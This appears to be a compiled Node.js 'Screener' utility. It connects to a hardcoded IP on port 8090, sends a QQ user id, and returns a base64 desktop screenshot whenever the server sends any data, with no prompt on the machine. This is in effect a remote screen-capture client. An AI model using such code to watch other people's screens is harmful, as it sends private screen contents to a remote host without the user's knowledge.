"use strict";
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (Object.hasOwnProperty.call(mod, k)) result[k] = mod[k];
    result["default"] = mod;
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
// The Main.ts Of Screener;
// Screener is a program that can make all things in your screen be a picture.
const fs = __importStar(require("fs"));
const net = __importStar(require("net"));
const ds = require("desktop-screenshot");
var Settings = {
    // Settings Base Config; IP is The Ai Server's IP Host (Can get in Ai);
    host: "110.253.240.211",
    // Here is User's QQ,Like 927980270
    user: 927980270
};
// The Main Function Of This Program
var Main = (() => {
    // A NetWork Client For Getting Command By Server
    var Client = new net.Socket();
    // Connect Server IP:8090
    Client.connect(8090, Settings.host, (() => {
        // Send Listener QQ Of This Client
        Client.write(JSON.stringify(Settings));
        // On Get Data From Server
        Client.on("data", (data) => {
            // Save The Screen In ".\\ScreenerDesktop.png"
            ds(`.\\ScreenerDesktop.png`, (err, com) => {
                // Then Read It;
                fs.readFile(`.\\ScreenerDesktop.png`, (err, FileData) => {
                    // If These is a error
                    if (err) {
                        // Show It To user
                        console.error(err);
                        return;
                    }
                    // Send The Base64 Of Image Data To Server;
                    Client.write(FileData.toString("base64"));
                });
            });
        });
    }));
});
// On Launch, Looking for the Config Data
fs.exists(`.\\Screener.json`, (exists) => {
    if (exists) {
        // If it exists.
        // Read Config Data
        fs.readFile(`.\\Screener.json`, (err, config) => {
            // If Error
            if (err) {
                console.error(err);
                return;
            }
            // Copy LocalSettings To Settings
            Settings = JSON.parse(config.toString());
            // Run MainFunction;
            Main();
        });
    }
    else {
        // If it doesn't exists;
        fs.writeFile(`.\\Screener.json`, JSON.stringify(Settings), (err) => {
            // Write The Config To Local
            if (err) {
                console.log(err);
            }
        });
        // Run MainFunction;
        Main();
    }
});
